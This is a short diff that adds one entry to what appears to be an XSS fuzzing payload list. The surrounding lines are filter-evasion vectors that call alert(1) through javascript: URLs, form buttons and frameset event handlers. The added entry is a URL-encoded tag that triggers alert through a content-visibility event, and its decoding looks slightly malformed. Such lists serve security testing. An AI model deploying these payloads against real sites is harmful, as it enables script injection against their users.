@@ -676,6 +676,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <form><a href="javascript:\u0061lert(1)">X
 <form><button formaction="javascript:javascript:alert(1)">X
 <form><button formaction=javascript&colon;alert(1)>CLICKME
+<mctx%2FOnCoNtEnTvIsIbIlItYaUtOsTaTeChAnGe%3Dalert%601%61%09STYLE%3Ddisplay%3Ablock%3Bcontent-visibility%3Aauto>
 <frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
 <frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
 <frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
